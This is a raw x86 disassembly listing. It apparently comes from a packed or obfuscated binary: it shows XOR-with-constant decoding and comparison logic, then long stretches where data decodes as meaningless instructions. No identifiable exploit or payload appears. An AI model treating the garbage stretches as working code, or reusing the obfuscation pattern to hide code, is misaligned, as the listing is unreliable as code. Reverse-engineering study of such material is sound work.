  409bc7:	mov    edx,DWORD PTR [ebp-0x5c]
  409bca:	xor    eax,edi
  409bcc:	shl    ecx,0x1e
  409bcf:	xor    edx,edx
  409bd1:	or     eax,edx
  409bd3:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  409bd7:	mov    eax,DWORD PTR [ebp+0x14]
  409bda:	or     BYTE PTR [eax],cl
  409bdc:	mov    eax,DWORD PTR [ebp-0x48]
  409bdf:	mov    ecx,DWORD PTR [ebp-0x44]
  409be2:	shrd   eax,ecx,0x2
  409be6:	shr    ecx,0x2
  409be9:	mov    ecx,DWORD PTR [ebp-0x48]
  409bec:	mov    edx,DWORD PTR [ebp-0x44]
  409bef:	xor    eax,edi
  409bf1:	xor    edx,edx
  409bf3:	or     eax,edx
  409bf5:	add    eax,DWORD PTR ds:0x422588
  409bfb:	shl    ecx,0x1e
  409bfe:	mov    DWORD PTR [ebp+0x14],eax
  409c01:	mov    eax,DWORD PTR [ebp-0x48]
  409c04:	mov    ecx,DWORD PTR [ebp-0x44]
  409c07:	shrd   eax,ecx,0x2
  409c0b:	shr    ecx,0x2
  409c0e:	mov    ecx,DWORD PTR [ebp-0x48]
  409c11:	mov    edx,DWORD PTR [ebp-0x44]
  409c14:	xor    eax,edi
  409c16:	shl    ecx,0x1e
  409c19:	xor    edx,edx
  409c1b:	or     eax,edx
  409c1d:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  409c21:	mov    eax,DWORD PTR [ebp+0x14]
  409c24:	add    BYTE PTR [eax],cl
  409c26:	mov    eax,DWORD PTR [ebp-0x38]
  409c29:	mov    ecx,DWORD PTR [ebp-0x34]
  409c2c:	shrd   eax,ecx,0x2
  409c30:	shr    ecx,0x2
  409c33:	mov    ecx,DWORD PTR [ebp-0x38]
  409c36:	mov    edx,DWORD PTR [ebp-0x34]
  409c39:	xor    edx,edx
  409c3b:	xor    eax,edi
  409c3d:	or     eax,edx
  409c3f:	add    eax,DWORD PTR ds:0x422588
  409c45:	shl    ecx,0x1e
  409c48:	mov    ecx,DWORD PTR [ebp-0x38]
  409c4b:	mov    edx,DWORD PTR [ebp-0x34]
  409c4e:	shrd   ecx,edx,0x2
  409c52:	xor    ecx,edi
  409c54:	shr    edx,0x2
  409c57:	mov    edx,DWORD PTR [ebp-0x38]
  409c5a:	mov    edi,DWORD PTR [ebp-0x34]
  409c5d:	xor    edi,edi
  409c5f:	or     ecx,edi
  409c61:	mov    cl,BYTE PTR [ebp+ecx*1-0x4]
  409c65:	or     BYTE PTR [eax],cl
  409c67:	shl    edx,0x1e
  409c6a:	mov    edx,DWORD PTR [ebx]
  409c6c:	mov    eax,DWORD PTR [ebx+0x4]
  409c6f:	mov    edi,DWORD PTR [ebx]
  409c71:	mov    ecx,DWORD PTR [ebx+0x4]
  409c74:	xor    edx,0xca79a577
  409c7a:	xor    eax,0x9c1b89e8
  409c7f:	shrd   edx,eax,0x2
  409c83:	xor    ecx,ecx
  409c85:	or     ecx,edx
  409c87:	mov    DWORD PTR [ebp+0x8],ecx
  409c8a:	mov    ecx,DWORD PTR [esi]
  409c8c:	mov    edx,DWORD PTR [esi+0x4]
  409c8f:	xor    edx,0x9c1b89e8
  409c95:	xor    ecx,0xca79a577
  409c9b:	mov    DWORD PTR [ebp+0x14],ecx
  409c9e:	mov    ecx,edx
  409ca0:	mov    edx,DWORD PTR [ebp+0x14]
  409ca3:	shrd   edx,ecx,0x2
  409ca7:	shr    eax,0x2
  409caa:	shl    edi,0x1e
  409cad:	mov    DWORD PTR [ebp-0x6c],eax
  409cb0:	mov    DWORD PTR [ebp-0x70],edx
  409cb3:	mov    edx,DWORD PTR [esi]
  409cb5:	mov    eax,0x40000000
  409cba:	xor    edi,eax
  409cbc:	or     edi,DWORD PTR [ebp-0x6c]
  409cbf:	mov    DWORD PTR [ebp+0x14],edx
  409cc2:	shl    DWORD PTR [ebp+0x14],0x1e
  409cc6:	xor    DWORD PTR [ebp+0x14],eax
  409cc9:	mov    DWORD PTR [ebp+0xc],edi
  409ccc:	jmp    0x40a0aa
  409cd1:	jbe    0x409d4e
  409cd3:	fstp   TBYTE PTR [edx+ebx*8-0x78e4c9e4]
  409cda:	ins    DWORD PTR es:[edi],dx
  409cdb:	cmp    DWORD PTR [esp+ecx*2-0x6c],0x4f
  409ce0:	jle    0x409caf
  409ce2:	cmp    DWORD PTR [eax],ebx
  409ce4:	sbb    BYTE PTR [esi-0x50e7e7ee],bl
  409cea:	out    dx,eax
  409ceb:	div    edi
  409ced:	push   0x36
  409cef:	dec    ebx
  409cf0:	mov    ecx,0xf898f4ef
  409cf5:	xchg   BYTE PTR [eax+0x0],dh
  409cf8:	ret    
  409cf9:	add    DWORD PTR [esi],edi
  409cfb:	outs   dx,BYTE PTR ds:[esi]
  409cfc:	or     al,0xdc
  409cfe:	sub    DWORD PTR [edi-0xd],0x8e8b4c65
  409d05:	add    DWORD PTR [eax-0x35924eb],esi
  409d0b:	xlat   BYTE PTR ds:[ebx]
  409d0c:	and    al,0x9c
  409d0e:	pop    ds
  409d0f:	in     eax,0x3
  409d11:	imul   edx,DWORD PTR [esi-0x3659692a],0xffffffdc
  409d18:	cmp    al,0xfe
  409d1a:	dec    ebp
  409d1b:	xor    BYTE PTR [ecx-0x5],al
  409d1e:	fild   DWORD PTR [ebp-0x50]
  409d21:	cs aas 
  409d23:	out    dx,al
  409d24:	(bad)  
  409d25:	(bad)  
  409d27:	xor    dh,BYTE PTR [edi+eax*8]
  409d2a:	sbb    dh,BYTE PTR [edi+0x70218837]
  409d30:	push   cs
  409d31:	jle    0x409d85
  409d33:	jp     0x409d54
  409d35:	shr    BYTE PTR [eax+0x1693e80c],0x6
  409d3c:	cld    
  409d3d:	mov    edi,edi
  409d3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d40:	sbb    ch,dh
  409d42:	adc    ecx,ecx
  409d44:	cdq    
  409d45:	adc    BYTE PTR [ebx],0x7b
  409d48:	push   ebx
  409d49:	push   edx
  409d4a:	mov    al,0x8
  409d4c:	xor    eax,0xd033a0d0
  409d51:	mov    ah,0x7e
  409d53:	pop    ss
  409d54:	mov    bh,0x68
  409d56:	in     eax,dx
  409d57:	jne    0x409d31
  409d59:	mov    ch,0x52
  409d5b:	and    eax,0xc92c2a28
  409d60:	(bad)  
  409d61:	mov    cs,WORD PTR [eax]
  409d63:	fst    QWORD PTR [ecx-0x2e297ce5]
  409d69:	sub    BYTE PTR [edx],dh
  409d6b:	mov    ecx,DWORD PTR [esi-0x52ff3da7]
  409d71:	jno    0x409dbd
  409d73:	cwde   
  409d74:	dec    esp
  409d75:	push   esi
  409d76:	cmp    ebx,DWORD PTR [edi]
  409d78:	imul   esp,ebx,0x58
  409d7b:	rcl    esp,0x84
  409d7e:	(bad)  
  409d7f:	adc    al,0xdb
  409d81:	sbb    eax,0xd614fc69
  409d86:	pushf  
  409d87:	loope  0x409d20
  409d89:	jp     0x409d5c
  409d8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d8c:	or     ebp,DWORD PTR [ebx]
  409d8e:	stos   BYTE PTR es:[edi],al
  409d8f:	mov    ch,0xed
  409d91:	loop   0x409dd1
  409d93:	sbb    al,0xcd
  409d95:	push   eax
  409d96:	retf   
  409d97:	(bad)  
  409d98:	call   0x41b6:0xb0d89ebc
  409d9f:	icebp  
  409da0:	xchg   ecx,eax
  409da1:	mov    ebp,0x848eb471
  409da6:	les    ebp,FWORD PTR [edi]
  409da8:	cwde   
  409da9:	sbb    bl,dl
  409dab:	aas    
  409dac:	lock sbb ecx,DWORD PTR [esi-0x5a]
  409db0:	test   DWORD PTR [edi+edx*8+0x43],esp
  409db4:	inc    ecx
  409db5:	dec    ebp
  409db6:	xor    DWORD PTR [eax-0x3],esp
  409db9:	add    DWORD PTR [edx],esi
  409dbb:	retfw  0x130a
  409dbf:	pop    eax
  409dc0:	add    al,0x9f
  409dc2:	jl     0x409e05
  409dc4:	cmp    esi,eax
  409dc6:	add    ecx,ecx
  409dc8:	ins    DWORD PTR es:[edi],dx
  409dc9:	fistp  DWORD PTR [ebp+0x57]
  409dcc:	xor    al,0x76
  409dce:	imul   ebx,edx,0xffffff8b
  409dd1:	xchg   edx,eax
  409dd2:	retf   0x934f
  409dd5:	pop    ss
  409dd6:	cmp    ah,BYTE PTR es:[ebp+0x56c064a9]
  409ddd:	mov    dh,0xc6
  409ddf:	push   edi
  409de0:	sbb    bh,ah
  409de2:	das    
  409de3:	jle    0x409d96
  409de5:	jp     0x409d92
  409de7:	add    dl,al
  409de9:	test   BYTE PTR [ecx+eax*4-0x56cf0fba],bl
  409df0:	retf   
  409df1:	je     0x409e4f
  409df3:	jb     0x409db5
  409df5:	popf   
  409df6:	adc    ebp,DWORD PTR [esi]
  409df8:	out    0x40,al
  409dfa:	ins    BYTE PTR es:[edi],dx
  409dfb:	fwait
  409dfc:	(bad)  
  409dfd:	jns    0x409e64
  409dff:	shl    esp,0xa3
  409e02:	add    BYTE PTR [esi],cl
  409e04:	inc    ebx
  409e05:	ss dec eax
  409e07:	xchg   esp,eax
  409e08:	mov    WORD PTR [esi],fs
  409e0a:	mov    al,ds:0x8c1a173
  409e0f:	jge    0x409db4
  409e11:	xchg   ebx,eax
  409e12:	mov    ch,0xeb
  409e14:	mov    edx,0xcc94101a
  409e19:	sub    eax,0x1180a98f
  409e1e:	test   DWORD PTR [eax-0x25],esi
  409e21:	inc    edx
  409e22:	(bad)  
  409e23:	or     BYTE PTR [ecx+0x44],dl
  409e26:	push   esi
  409e27:	pop    ebp
  409e28:	sar    BYTE PTR ds:0x6c8bc5a4,1
  409e2e:	sub    eax,esi
  409e30:	xor    cl,BYTE PTR [edi+edi*2-0x7e]
  409e34:	test   dl,ah
  409e36:	jns    0x409dff
  409e38:	dec    eax
  409e39:	fnstcw WORD PTR [esi+0x35]
  409e3c:	xchg   ebp,eax
  409e3d:	cld    
  409e3e:	mov    DWORD PTR [ecx+0x3a30b6b5],edx
  409e44:	pop    esi
  409e45:	mov    eax,0xb58aef06
  409e4a:	int3   
  409e4b:	leave  
  409e4c:	xchg   edi,eax
  409e4d:	dec    edi
  409e4e:	xchg   esi,eax
  409e4f:	adc    ebx,eax
  409e51:	push   ss
  409e52:	mov    ds:0x382c06f4,al
  409e57:	mov    BYTE PTR [esi-0x3d],ah
  409e5a:	mov    eax,0x94af7c4e
  409e5f:	call   0xea44883a
  409e64:	sbb    ah,BYTE PTR [eax]
  409e66:	cdq    
  409e67:	add    al,0x9d
  409e69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e6b:	sbb    al,0xb0
  409e6d:	out    0x67,eax
  409e6f:	mov    dl,0xef
  409e71:	clc    
  409e72:	and    BYTE PTR [eax-0x33],ch
  409e75:	xchg   ecx,eax
  409e76:	retf   
  409e77:	dec    ecx
  409e78:	jg     0x409ed3
  409e7a:	pusha  
  409e7b:	fadd   st(0),st
  409e7d:	mov    ds:0x51d9ff76,eax
  409e82:	inc    ebp
  409e83:	lods   al,BYTE PTR ds:[esi]
  409e84:	es xchg ebp,eax
  409e86:	jo     0x409e33
  409e88:	aad    0x7c
  409e8a:	xchg   bh,bl
  409e8c:	add    BYTE PTR [eax],bh
  409e8e:	mov    ebx,0x1d3ee096
  409e93:	and    BYTE PTR ds:0x97619fee,al
  409e99:	shl    eax,0xc7
  409e9c:	(bad)  
  409e9d:	in     al,0x14
  409e9f:	cli    
  409ea0:	fld    QWORD PTR [ebx*2+0x69ace38c]
  409ea7:	mov    bl,0x7f
  409ea9:	test   al,0x73
  409eab:	call   DWORD PTR [eax]
  409ead:	out    dx,eax
  409eae:	inc    eax
  409eaf:	adc    edi,ebp
  409eb1:	lods   al,BYTE PTR ss:[esi]
  409eb3:	js     0x409ed7
  409eb5:	cld    
  409eb6:	lods   al,BYTE PTR ds:[esi]
  409eb7:	cmp    BYTE PTR [esi+eax*2-0x1],0xe1
  409ebc:	push   eax
  409ebd:	scas   al,BYTE PTR es:[edi]
  409ebe:	out    0xe,eax
  409ec0:	jmp    0x5b7ef7fc
  409ec5:	rcl    bh,0xa9
  409ec8:	and    ebp,DWORD PTR [eax+0x3a2b380b]
  409ece:	pop    es
  409ecf:	dec    ebp
  409ed0:	jmp    0xf181:0x529b5aef
  409ed7:	(bad)  
  409ed8:	jo     0x409f0d
  409eda:	jecxz  0x409ef8
  409edc:	mov    bl,0xe9
  409ede:	sub    BYTE PTR [ebx],dl
  409ee0:	retf   
  409ee1:	or     esp,DWORD PTR [ebx-0x4]
  409ee4:	xor    eax,0xf5dd421d
  409ee9:	pushf  
  409eea:	xor    eax,0xccdce1c1
  409eef:	xchg   esi,eax
  409ef0:	call   FWORD PTR [eax+0x2183c66f]
  409ef6:	inc    ebp
  409ef7:	cdq    
  409ef8:	in     eax,dx
  409ef9:	stos   DWORD PTR es:[edi],eax
  409efa:	(bad)  
  409efb:	sub    ch,BYTE PTR [ebx]
  409efd:	jg     0x409f09
  409eff:	int3   
  409f00:	into   
  409f01:	xchg   edi,edx
  409f03:	daa    
  409f04:	mov    eax,0x5267fd39
  409f09:	call   DWORD PTR [edx+0x7b]
  409f0c:	inc    edx
  409f0d:	jb     0x409ee8
  409f0f:	push   0xb934b3f9
  409f14:	adc    BYTE PTR [eax+0x642db929],bl
  409f1a:	test   eax,0x62d35166
  409f1f:	or     al,0x20
  409f21:	fwait
  409f22:	xchg   BYTE PTR [ebx+0x22],bh
  409f25:	and    dl,BYTE PTR fs:[esp+ebp*8-0x1695015e]
  409f2d:	jle    0x409f8c
  409f2f:	jbe    0x409ef3
  409f31:	dec    ebx
  409f32:	add    ecx,DWORD PTR [ebx-0x7]
  409f35:	cmp    bh,BYTE PTR [ecx]
  409f37:	jle    0x409f12
  409f39:	shl    DWORD PTR [ecx+0x37],1
  409f3c:	xchg   edi,eax
  409f3d:	mov    cs,WORD PTR [ecx-0x34]
  409f40:	dec    ecx
  409f41:	mov    BYTE PTR [edx],dh
  409f43:	inc    edx
  409f44:	dec    edi
  409f45:	jns    0x409efa
  409f47:	outs   dx,BYTE PTR ds:[esi]
  409f48:	icebp  
  409f49:	mov    bh,0xb4
  409f4b:	jmp    0xae89:0xc930498f
  409f52:	fwait
  409f53:	test   eax,0x1447fcb9
  409f58:	or     BYTE PTR [ebx+0x50],ch
  409f5b:	push   ss
  409f5c:	cdq    
  409f5d:	push   ds
  409f5e:	sub    bh,cl
  409f60:	cmp    eax,0x3688410e
  409f65:	test   DWORD PTR [eax],esp
  409f67:	call   0x9095:0xb1be44f0
  409f6e:	ins    BYTE PTR es:[edi],dx
  409f6f:	add    bh,BYTE PTR [ecx]
  409f71:	push   edi
  409f72:	push   es
  409f73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f74:	ret    
  409f75:	adc    al,0xec
  409f77:	pop    ecx
  409f78:	push   0x9773babf
  409f7d:	xchg   DWORD PTR [ebx+0x14f79f53],ecx
  409f83:	repnz mov dl,0x87
  409f86:	or     al,0x19
  409f88:	fld    QWORD PTR [edx-0x69]
  409f8b:	das    
  409f8c:	call   0x9eb3de57
  409f91:	mov    WORD PTR [ecx-0x38],?
  409f94:	rcl    DWORD PTR [edi-0x3],cl
  409f97:	out    0x5e,al
  409f99:	stc    
  409f9a:	mov    DWORD PTR [esi-0x75f6ce6a],0x504c2c79
  409fa4:	mov    dh,0xe9
  409fa6:	jp     0x409fed
  409fa8:	inc    ecx
  409fa9:	retf   0x4721
  409fac:	xor    al,0x5c
  409fae:	xchg   dl,dh
  409fb0:	lock and ebx,esi
  409fb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fb4:	adc    DWORD PTR [ebx+0x41],ebx
  409fb7:	inc    esp
  409fb8:	fadd   DWORD PTR ds:0xa359a4e6
  409fbe:	push   ebx
  409fbf:	mov    cl,0xa6
  409fc1:	fisub  WORD PTR [ecx+0x40]
  409fc4:	fisttp QWORD PTR [ecx-0xa]
  409fc7:	aaa    
  409fc8:	cmc    
  409fc9:	jp     0x40a019
  409fcb:	adc    ecx,ebp
  409fcd:	in     eax,0xd6
  409fcf:	dec    edi
  409fd0:	jmp    0x31a2:0x22b54169
  409fd7:	sub    esi,ebx
  409fd9:	jmp    0x47f7f17a
  409fde:	adc    eax,0x50a6bb69
  409fe3:	(bad)  
  409fe4:	pop    ebx
  409fe5:	push   0x61
  409fe7:	cmp    BYTE PTR [ebx],ah
  409fe9:	addr16 stc 
  409feb:	dec    esi
  409fec:	mov    bh,0xc0
  409fee:	(bad)  
  409fef:	jb     0x409fec
  409ff1:	inc    edx
  409ff2:	xchg   ebx,eax
  409ff3:	in     eax,dx
  409ff4:	(bad)  
  409ff6:	loop   0x409fc4
  409ff8:	mov    bl,0xed
  409ffa:	mov    ebp,0xe7f63b52
  409fff:	lods   al,BYTE PTR ds:[esi]
  40a000:	and    BYTE PTR [ebx],0xe0
  40a003:	jae    0x409fd5
  40a005:	xchg   ebx,eax
  40a006:	sbb    DWORD PTR [ecx],esp
  40a008:	xor    ecx,esi
  40a00a:	test   DWORD PTR [edi+0x20],esi
  40a00d:	xor    eax,0x422c7529
  40a012:	fimul  WORD PTR [eax]
  40a014:	push   0x3009c533
  40a019:	pop    esi
  40a01a:	inc    edi
  40a01b:	jo     0x409fd4
  40a01d:	jp     0x409fef
  40a01f:	jo     0x409fb8
  40a021:	dec    esi
  40a022:	ret    0x4313
  40a025:	sub    eax,ecx
  40a027:	mov    ds:0x31070ccb,eax
  40a02c:	or     DWORD PTR [edi-0x5a9eee5b],0x11d4f85b
  40a036:	lea    edx,ds:0xfadd4eb8
  40a03c:	ja     0x40a052
  40a03e:	mov    al,dh
  40a040:	jl     0x409ffe
  40a042:	cmp    al,0xde
  40a044:	std    
  40a045:	mov    ebp,0x3c9c9ccb
  40a04a:	mov    WORD PTR [ecx+0x2921aca5],ss
  40a050:	repnz cld 
  40a052:	push   cs
  40a053:	repnz loopne 0x40a085
  40a056:	in     al,dx
  40a057:	pop    eax
  40a058:	loopne 0x40a026
  40a05a:	dec    esi
  40a05b:	idiv   BYTE PTR [ebp+0x52]
  40a05e:	jbe    0x40a010
  40a060:	lods   al,BYTE PTR ds:[esi]
  40a061:	push   ss
  40a062:	scas   al,BYTE PTR es:[edi]
  40a063:	and    ebp,ebp
  40a065:	(bad)  
  40a069:	or     BYTE PTR [edi+0x2bd03755],0xce
  40a070:	repz bound ebx,QWORD PTR [esi]
  40a073:	iret   
  40a074:	push   esp
  40a075:	in     al,0xe
  40a077:	shl    edi,0x9
  40a07a:	pop    eax
  40a07b:	inc    ebp
  40a07c:	inc    edi
  40a07d:	fild   WORD PTR [ebx+0x54bfa487]
  40a083:	fcomip st,st(1)
  40a085:	sbb    al,0x94
  40a087:	xchg   ebp,eax
  40a088:	popa   
  40a089:	jmp    0xd954:0x3aa8a487
  40a090:	add    bl,BYTE PTR [ecx-0x7b421e6f]
  40a096:	adc    cl,dh
  40a098:	hlt    
  40a099:	out    dx,al
  40a09a:	ret    
  40a09b:	mov    BYTE PTR [edi-0x6abcbeb7],dh
  40a0a1:	mov    ecx,0xc837f622
  40a0a6:	pop    ds
  40a0a7:	inc    eax
  40a0a8:	pusha  
  40a0a9:	xchg   BYTE PTR [ebx+0x7d8b047e],cl
  40a0af:	adc    al,0x33
  40a0b1:	ror    BYTE PTR [ebx],cl
  40a0b3:	push   ebp
  40a0b4:	nop
  40a0b5:	shr    ecx,0x2
  40a0b8:	or     edi,ecx
  40a0ba:	cmp    edx,DWORD PTR [ebp+0x8]
  40a0bd:	jne    0x40a9b0
  40a0c3:	cmp    edi,DWORD PTR [ebp+0xc]
  40a0c6:	jne    0x40a9b0
  40a0cc:	jmp    0x40a926
  40a0d1:	mov    eax,DWORD PTR [esi]
  40a0d3:	mov    edx,DWORD PTR [esi+0x4]
  40a0d6:	mov    eax,DWORD PTR [esi]
  40a0d8:	mov    edx,DWORD PTR [esi+0x4]
  40a0db:	xor    eax,0xca79a577
  40a0e0:	xor    edx,ecx
  40a0e2:	mov    ecx,eax
  40a0e4:	mov    eax,edx
  40a0e6:	shrd   ecx,eax,0x2
  40a0ea:	shr    eax,0x2
  40a0ed:	mov    DWORD PTR [ebp+0xc],eax
  40a0f0:	mov    eax,DWORD PTR [esi]
  40a0f2:	mov    edx,DWORD PTR [esi+0x4]
  40a0f5:	mov    edx,eax
  40a0f7:	xor    eax,eax
  40a0f9:	or     eax,ecx
  40a0fb:	mov    ecx,DWORD PTR [ebx]
  40a0fd:	shl    edx,0x1e
  40a100:	xor    edx,0x40000000
  40a106:	mov    DWORD PTR [ebp+0x10],eax
  40a109:	mov    eax,edx
  40a10b:	or     eax,DWORD PTR [ebp+0xc]
  40a10e:	mov    edx,DWORD PTR [ebx+0x4]
  40a111:	push   eax
  40a112:	push   DWORD PTR [ebp+0x10]
  40a115:	push   edx
  40a116:	push   ecx
  40a117:	jmp    0x40a4f5
  40a11c:	std    
  40a11d:	dec    ecx
  40a11e:	mov    ah,0xd2
  40a120:	sub    al,0x22
  40a122:	fidivr DWORD PTR [edi]
  40a124:	test   al,0x29
  40a126:	push   ebp
  40a127:	stos   BYTE PTR es:[edi],al
  40a128:	fldcw  WORD PTR [eax+0x1d]
  40a12b:	jle    0x40a17f
  40a12d:	xor    ebx,DWORD PTR [eax]
  40a12f:	sbb    BYTE PTR [esi-0x40e7e7ee],bl
  40a135:	sbb    al,0x1e
  40a137:	imul   DWORD PTR [ecx+0x54]
  40a13a:	cmc    
  40a13b:	(bad)  
  40a13c:	sub    ecx,DWORD PTR [edx+0x2aa86e44]
  40a142:	iret   
  40a143:	xor    cl,al
  40a145:	fst    QWORD PTR gs:[edi]
  40a148:	jl     0x40a131
  40a14a:	sub    bl,ah
  40a14c:	push   edi
  40a14d:	push   ds
  40a14e:	push   esp
  40a14f:	fwait
  40a150:	xchg   esi,eax
  40a151:	imul   ebx,DWORD PTR [edx],0xffffffd3
  40a154:	mov    esp,DWORD PTR [edx+ebp*1-0x59890f26]
  40a15b:	lods   al,BYTE PTR ds:[esi]
  40a15c:	iret   
  40a15d:	and    eax,0x4f1e4775
  40a162:	mov    gs,edi
  40a164:	cmp    DWORD PTR [esi+0x53],eax
  40a167:	les    ecx,FWORD PTR [edx]
  40a169:	shl    DWORD PTR [ecx+0x2049b5a9],0x34
  40a170:	mov    al,0xd7
  40a172:	fcomp  st(7)
  40a174:	xchg   ebp,eax
  40a175:	pop    DWORD PTR [ebp-0x5c]
  40a178:	je     0x40a19e
  40a17a:	add    al,0xef
  40a17c:	mov    esp,0xe7fd68a1
  40a181:	icebp  
  40a182:	enter  0xcdea,0x81
  40a186:	sub    cl,bh
  40a188:	aad    0xb0
  40a18a:	iret   
  40a18b:	add    al,0x45
  40a18d:	sbb    ch,bh
  40a18f:	retf   
  40a190:	or     DWORD PTR [edx],ecx
  40a192:	inc    eax
  40a193:	out    dx,eax
  40a194:	test   al,0x68
  40a196:	std    
  40a197:	sar    BYTE PTR [ecx-0xa],1
  40a19a:	rol    DWORD PTR [edx+0x21dbfb06],1
  40a1a0:	daa    
  40a1a1:	pusha  
  40a1a2:	jne    0x40a1fc
  40a1a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1a5:	jp     0x40a19e
  40a1a7:	jb     0x40a144
  40a1a9:	dec    eax
  40a1aa:	push   cs
  40a1ab:	(bad)
  40a1af:	cs or  ebp,ebx
  40a1b2:	fisttp WORD PTR [ebx-0x25]
  40a1b5:	mov    ecx,0xd964551
  40a1ba:	(bad)  
  40a1bb:	jb     0x40a15a
  40a1bd:	cli    
  40a1be:	push   cs
  40a1bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1c0:	add    al,0xdd
  40a1c2:	scas   eax,DWORD PTR es:[edi]
  40a1c3:	loop   0x40a17b
  40a1c5:	in     eax,0x35
  40a1c7:	xchg   BYTE PTR [edx-0x24],bh
  40a1ca:	ret    0x633e
  40a1cd:	xchg   BYTE PTR [esi-0x23],ch
  40a1d0:	into   
  40a1d1:	push   ebp
  40a1d2:	mov    ebp,0xadb5dd01
  40a1d7:	sahf   
  40a1d8:	bound  ebx,QWORD PTR [esi-0x17]
  40a1db:	inc    edi
  40a1dc:	retf   
  40a1dd:	push   edx
  40a1de:	call   0x37f85851
  40a1e3:	aas    
  40a1e4:	jp     0x40a24b
  40a1e6:	pusha  
  40a1e7:	shl    DWORD PTR [ebx],cl
  40a1e9:	sbb    eax,0xdf84a677
  40a1ee:	dec    edx
  40a1ef:	clc    
  40a1f0:	stos   BYTE PTR es:[edi],al
  40a1f1:	push   cs
  40a1f2:	aad    0x5f
  40a1f4:	stos   BYTE PTR es:[edi],al
  40a1f5:	mov    ebx,0x29d3fa82
  40a1fa:	pop    esi
  40a1fb:	pushf  
  40a1fc:	in     al,dx
  40a1fd:	shl    BYTE PTR [edx+0x1b459052],0x16
  40a204:	pop    ebx
  40a205:	hlt    
  40a206:	into   
  40a207:	mov    ch,dh
  40a209:	xchg   DWORD PTR [esi],ecx
  40a20b:	inc    edi
  40a20c:	mov    ecx,0x91a6e933
  40a211:	int3   
  40a212:	fldenv ds:0xc9fa7700
  40a218:	out    dx,eax
  40a219:	xor    BYTE PTR [eax-0x56],dl
  40a21c:	jo     0x40a23c
  40a21e:	sub    eax,0x464c681c
  40a223:	pop    esp
  40a224:	push   edx
  40a225:	push   ebx
  40a226:	jae    0x40a264
  40a228:	cli    
  40a229:	pop    ss
  40a22a:	arpl   WORD PTR [esi+0x54cf2f2b],cx
  40a230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a231:	jg     0x40a251
  40a233:	shr    BYTE PTR [edx+0x3a9bed6b],0xed
  40a23a:	shr    DWORD PTR [edi-0x11],1
  40a23d:	jno    0x40a1dd
  40a23f:	jl     0x40a289
  40a241:	sbb    DWORD PTR [eax],ebp
  40a243:	cmp    eax,0x5f21b39c
  40a248:	adc    ah,cl
  40a24a:	sbb    esp,esi
  40a24c:	lds    edx,FWORD PTR cs:[ebx-0x31]
  40a250:	icebp  
  40a251:	jns    0x40a217
  40a253:	into   
  40a254:	imul   edx,DWORD PTR [ebp+0x53],0x8
  40a258:	ss cwde 
  40a25a:	dec    BYTE PTR [esi-0x13f5f60d]
  40a260:	pop    edx
  40a261:	add    edi,DWORD PTR [ecx+eax*4-0x6b]
  40a265:	adc    cl,BYTE PTR [ecx+0x13]
  40a268:	or     eax,esi
  40a26a:	sub    al,dl
  40a26c:	data16 ss sub al,0xc6
  40a270:	std    
  40a271:	call   0x9b84:0xd446f856
  40a278:	adc    ah,BYTE PTR [edi]
  40a27a:	outs   dx,BYTE PTR ds:[esi]
  40a27b:	adc    DWORD PTR [ebp+0x66],0x2278d483
  40a282:	push   ss
  40a283:	pusha  
  40a284:	(bad)  
  40a285:	mov    al,ds:0xf98b924b
  40a28a:	push   ecx
  40a28b:	in     eax,dx
  40a28c:	inc    eax
  40a28d:	pop    ds
  40a28e:	jle    0x40a2c9
  40a290:	aad    0x79
  40a292:	pop    esp
  40a293:	js     0x40a27a
  40a295:	popf   
  40a296:	xor    bh,ah
  40a298:	xchg   ebx,eax
  40a299:	inc    ebp
  40a29a:	leave  
  40a29b:	add    ch,BYTE PTR [ebp+ebx*4+0x4]
  40a29f:	test   BYTE PTR [edi+0x4efa587b],ch
  40a2a5:	adc    dl,BYTE PTR [edx]
  40a2a7:	mov    bh,0x32
  40a2a9:	ja     0x40a2e6
  40a2ab:	push   edi
  40a2ac:	push   ss
  40a2ad:	dec    edi
  40a2ae:	adc    al,0xc9
  40a2b0:	cmp    BYTE PTR [edx-0x72],dl
  40a2b3:	int3   
  40a2b4:	sets   ch
  40a2b7:	in     eax,0xe
  40a2b9:	and    al,0x38
  40a2bb:	adc    ch,BYTE PTR [edi-0x520d803e]
  40a2c1:	sub    bp,dx
  40a2c4:	jbe    0x40a290
  40a2c6:	add    DWORD PTR [edx+0x4bc38c2f],ebx
  40a2cc:	cmp    ecx,DWORD PTR [esi]
  40a2ce:	jne    0x40a26d
  40a2d0:	fcmovb st,st(2)
  40a2d2:	fild   WORD PTR [esi-0x4]
  40a2d5:	rcr    BYTE PTR [esi+0x54c085a8],0x36
  40a2dc:	lea    esp,[ebp-0x13]
  40a2df:	pop    ecx
  40a2e0:	dec    edx
  40a2e1:	xchg   DWORD PTR [edx],esp
  40a2e3:	push   es
  40a2e4:	inc    eax
  40a2e5:	sti    
  40a2e6:	inc    eax
  40a2e7:	imul   DWORD PTR [edx+esi*4]
  40a2ea:	inc    ebp
  40a2eb:	aam    0xef
  40a2ed:	(bad)  
  40a2ee:	fninit 
  40a2f0:	call   0x303c:0xf36efed3
  40a2f7:	nop
  40a2f8:	outs   dx,DWORD PTR cs:[esi]
  40a2fa:	jmp    0xa926b538
  40a2ff:	add    al,0x6
  40a301:	xchg   edx,eax
  40a302:	mov    bl,0x7
  40a304:	dec    BYTE PTR [esi+0x4bb07c42]
  40a30a:	sub    al,0xff
  40a30c:	xchg   DWORD PTR [esi+0x14],ecx
  40a30f:	lds    eax,FWORD PTR [ecx+0x74e46ef9]
  40a315:	mov    ah,0x36
  40a317:	sub    eax,0xa9712253
  40a31c:	push   ebx
  40a31d:	mov    esi,es
  40a31f:	adc    al,0x29
  40a321:	in     al,0x4d
  40a323:	push   cs
  40a324:	xchg   ecx,eax
  40a325:	inc    edi
  40a326:	fwait
  40a327:	leave  
  40a328:	retf   
  40a329:	lods   eax,DWORD PTR ds:[esi]
  40a32a:	push   es
  40a32b:	adc    DWORD PTR [eax],edx
  40a32d:	sub    BYTE PTR [ebx],cl
  40a32f:	out    0xb6,al
